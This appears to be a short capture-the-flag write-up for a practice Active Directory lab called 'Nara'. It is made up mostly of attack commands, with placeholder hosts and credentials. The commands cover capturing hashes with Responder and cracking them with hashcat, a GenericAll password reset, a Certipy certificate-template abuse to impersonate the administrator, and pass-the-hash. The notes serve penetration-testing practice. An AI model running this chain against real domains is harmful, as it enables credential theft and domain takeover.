# Nara
> DC enum + HashGrab + GenericAll + Certipy

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
bloodhound-python -u <user> -p <pass> -d nara.offsec -ns <IP> -c All
```

BloodHound analysis: user with `GenericAll` over another object.

## Exploitation

HashGrab for credential capture via Responder:

```
responder -I tun0 -A
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Access with compromised credentials.

## Privilege Escalation

Abusing `GenericAll` to reset target user's password:

```
net rpc password <target_user> newpass123 -U nara/<user>%<pass> -S <IP>
```

AD CS vulnerability identified with Certipy:

```
certipy find -u <user>@nara.offsec -p <pass> -dc-ip <IP> -vulnerable
certipy req -u <user>@nara.offsec -p <pass> -ca <CA> -template <template> -upn administrator@nara.offsec
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

Administrator hash → pass-the-hash to SYSTEM.
